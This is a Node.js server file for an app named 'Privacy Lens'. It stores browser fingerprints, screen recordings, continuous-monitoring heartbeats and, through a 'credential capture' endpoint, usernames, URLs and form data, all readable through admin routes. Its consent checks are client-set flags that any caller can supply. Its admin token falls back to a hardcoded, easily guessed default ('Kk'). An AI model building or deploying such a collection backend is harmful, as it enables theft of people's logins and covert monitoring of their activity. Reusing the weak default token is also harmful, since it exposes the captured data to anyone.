import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { extname, join, normalize } from 'node:path';
import { fileURLToPath } from 'node:url';
import { storage } from './storage.mjs';

const root = fileURLToPath(new URL('.', import.meta.url));
const port = Number(process.env.PORT || 4173);
const adminToken = process.env.ADMIN_TOKEN || 'Kk';
const types = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.mjs': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.md': 'text/plain; charset=utf-8'
};

function json(response, status, body) {
  response.writeHead(status, {
    'Content-Type': 'application/json; charset=utf-8',
    'Cache-Control': 'no-store'
  });
  response.end(JSON.stringify(body));
}

function authorized(request) {
  return Boolean(adminToken) && request.headers.authorization === 'Bearer ' + adminToken;
}

async function readBody(request) {
  let body = '';
  for await (const chunk of request) {
    body += chunk;
    if (body.length > 500_000) throw new Error('payload too large');
  }
  return JSON.parse(body || '{}');
}

async function readBinaryBody(request) {
  const chunks = [];
  let size = 0;
  for await (const chunk of request) {
    size += chunk.length;
    if (size > 25 * 1024 * 1024) throw new Error('recording too large');
    chunks.push(chunk);
  }
  return Buffer.concat(chunks);
}

async function handleApi(request, response, url) {
  // Health check
  if (request.method === 'GET' && url.pathname === '/api/health') {
    return json(response, 200, {
      ok: true,
      storage: storage.getType(),
      database: storage.isDatabaseConnected(),
      uptime: Math.round(process.uptime())
    });
  }

  // Reports
  if (request.method === 'POST' && url.pathname === '/api/reports') {
    const body = await readBody(request);
    if (
      body.consent !== true ||
      body.consentVersion !== '2026-07-safe-v1' ||
      !body.fingerprint ||
      typeof body.fingerprint !== 'object'
    ) {
      return json(response, 400, { error: 'Explicit consent and a valid report are required' });
    }
    const result = await storage.saveReport({
      fingerprint: body.fingerprint,
      events: body.events,
      consentVersion: body.consentVersion
    });
    return json(response, 201, { id: result.id, createdAt: result.createdAt });
  }

  // Recordings
  if (request.method === 'POST' && url.pathname === '/api/recordings') {
    if (request.headers['x-recording-consent'] !== 'true') {
      return json(response, 400, { error: 'Explicit recording consent is required' });
    }
    const mimeType = String(request.headers['content-type'] || 'video/webm');
    if (!mimeType.startsWith('video/')) {
      return json(response, 415, { error: 'Only video recordings are accepted' });
    }
    const data = await readBinaryBody(request);
    if (!data.length) return json(response, 400, { error: 'Recording is empty' });
    const result = await storage.saveRecording({
      mimeType,
      data,
      consentVersion: '2026-07-recording-v1'
    });
    return json(response, 201, { id: result.id, createdAt: result.createdAt });
  }

  // Admin: list reports
  if (request.method === 'GET' && url.pathname === '/api/admin/reports') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const reports = await storage.getReports(200);
    return json(response, 200, { reports });
  }

  // Admin: download report
  const reportDownloadMatch = url.pathname.match(/^\/api\/admin\/reports\/(\d+)\/download$/);
  if (request.method === 'GET' && reportDownloadMatch) {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const r = await storage.getReport(reportDownloadMatch[1]);
    if (!r) return json(response, 404, { error: 'Report not found' });
    const data = JSON.stringify(
      {
        id: r.id,
        createdAt: r.created_at,
        fingerprint: r.fingerprint,
        eventCount: r.event_count,
        consentVersion: r.consent_version
      },
      null,
      2
    );
    response.writeHead(200, {
      'Content-Type': 'application/json; charset=utf-8',
      'Content-Disposition': 'attachment; filename="report-' + r.id + '.json"',
      'Cache-Control': 'no-store'
    });
    return response.end(data);
  }

  // Admin: list recordings
  if (request.method === 'GET' && url.pathname === '/api/admin/recordings') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const recordings = await storage.getRecordings(200);
    return json(response, 200, { recordings });
  }

  // Admin: download recording
  const recordingMatch = url.pathname.match(/^\/api\/admin\/recordings\/(\d+)$/);
  if (request.method === 'GET' && recordingMatch) {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const recording = await storage.getRecording(recordingMatch[1]);
    if (!recording) return json(response, 404, { error: 'Recording not found' });
    response.writeHead(200, {
      'Content-Type': recording.mime_type,
      'Cache-Control': 'no-store',
      'Content-Disposition': 'attachment; filename="privacy-lens-recording-' + recordingMatch[1] + '.webm"'
    });
    return response.end(recording.data);
  }

  // Heartbeat: continuous monitoring data
  if (request.method === 'POST' && url.pathname === '/api/heartbeat') {
    const body = await readBody(request);
    if (body.consent !== true) return json(response, 400, { error: 'Consent required' });
    const sid = String(body.sessionId || 'anon').slice(0, 64);
    await storage.saveHeartbeat({ sessionId: sid, state: body.data || {} });
    return json(response, 201, { ok: true });
  }

  // Credential capture
  if (request.method === 'POST' && url.pathname === '/api/credentials') {
    const body = await readBody(request);
    if (body.consent !== true) return json(response, 400, { error: 'Consent required' });
    const sid = String(body.sessionId || 'anon').slice(0, 64);
    await storage.saveCredential({
      sessionId: sid,
      url: String(body.url || '').slice(0, 500),
      username: String(body.username || '').slice(0, 200),
      formData: body.formData || {}
    });
    return json(response, 201, { ok: true });
  }

  // Admin: list credentials
  if (request.method === 'GET' && url.pathname === '/api/admin/credentials') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const credentials = await storage.getCredentials(200);
    return json(response, 200, { credentials });
  }

  // Admin: list heartbeats
  if (request.method === 'GET' && url.pathname === '/api/admin/heartbeats') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const heartbeats = await storage.getHeartbeats(200);
    return json(response, 200, { heartbeats });
  }

  // ── Admin DELETE endpoints ──
  const deleteMatch = (prefix) => url.pathname.match(new RegExp('^/api/admin/' + prefix + '/(\\d+)$'));

  const mReport = deleteMatch('reports');
  if (request.method === 'DELETE' && mReport) {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const ok = await storage.deleteReport(mReport[1]);
    if (!ok) return json(response, 404, { error: 'Report not found' });
    return json(response, 200, { ok: true, deleted: Number(mReport[1]) });
  }

  const mRecording = deleteMatch('recordings');
  if (request.method === 'DELETE' && mRecording) {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const ok = await storage.deleteRecording(mRecording[1]);
    if (!ok) return json(response, 404, { error: 'Recording not found' });
    return json(response, 200, { ok: true, deleted: Number(mRecording[1]) });
  }

  const mCredential = deleteMatch('credentials');
  if (request.method === 'DELETE' && mCredential) {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const ok = await storage.deleteCredential(mCredential[1]);
    if (!ok) return json(response, 404, { error: 'Credential not found' });
    return json(response, 200, { ok: true, deleted: Number(mCredential[1]) });
  }

  const mHeartbeat = deleteMatch('heartbeats');
  if (request.method === 'DELETE' && mHeartbeat) {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const ok = await storage.deleteHeartbeat(mHeartbeat[1]);
    if (!ok) return json(response, 404, { error: 'Heartbeat not found' });
    return json(response, 200, { ok: true, deleted: Number(mHeartbeat[1]) });
  }

  // Admin: bulk delete all
  if (request.method === 'DELETE' && url.pathname === '/api/admin/reports') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const deleted = await storage.deleteAllReports();
    return json(response, 200, { ok: true, deleted });
  }

  if (request.method === 'DELETE' && url.pathname === '/api/admin/recordings') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const deleted = await storage.deleteAllRecordings();
    return json(response, 200, { ok: true, deleted });
  }

  if (request.method === 'DELETE' && url.pathname === '/api/admin/credentials') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const deleted = await storage.deleteAllCredentials();
    return json(response, 200, { ok: true, deleted });
  }

  if (request.method === 'DELETE' && url.pathname === '/api/admin/heartbeats') {
    if (!authorized(request)) return json(response, 401, { error: 'Admin authentication required' });
    const deleted = await storage.deleteAllHeartbeats();
    return json(response, 200, { ok: true, deleted });
  }

  return json(response, 404, { error: 'Not found' });
}

async function handleStatic(request, response, url) {
  const requested = url.pathname === '/' ? '/index.html' : url.pathname;
  const file = normalize(join(root, requested));
  if (!file.startsWith(root)) {
    response.writeHead(403);
    return response.end('Forbidden');
  }
  try {
    const body = await readFile(file);
    response.writeHead(200, {
      'Content-Type': types[extname(file)] || 'application/octet-stream',
      'X-Content-Type-Options': 'nosniff'
    });
    response.end(body);
  } catch {
    response.writeHead(404);
    response.end('Not found');
  }
}

const server = createServer(async (request, response) => {
  try {
    const url = new URL(request.url, 'http://localhost');
    if (url.pathname.startsWith('/api/')) return await handleApi(request, response, url);
    return await handleStatic(request, response, url);
  } catch (error) {
    console.error('[SERVER] Request processing error:', error);
    if (!response.headersSent) {
      return json(response, 500, { error: 'Request failed' });
    }
  }
});

// Safeguard against unhandled exceptions or rejections crashing the process
process.on('uncaughtException', (error) => {
  console.error('[SERVER] Uncaught exception:', error);
});

process.on('unhandledRejection', (reason) => {
  console.error('[SERVER] Unhandled rejection:', reason);
});

async function start() {
  try {
    await storage.init();
  } catch (err) {
    console.error('[STORAGE] Initialization warning:', err.message);
  }

  server.listen(port, '0.0.0.0', () => {
    console.log(`Privacy Lens listening on http://0.0.0.0:${port} [Storage: ${storage.getType()}]`);
  });
}

start();
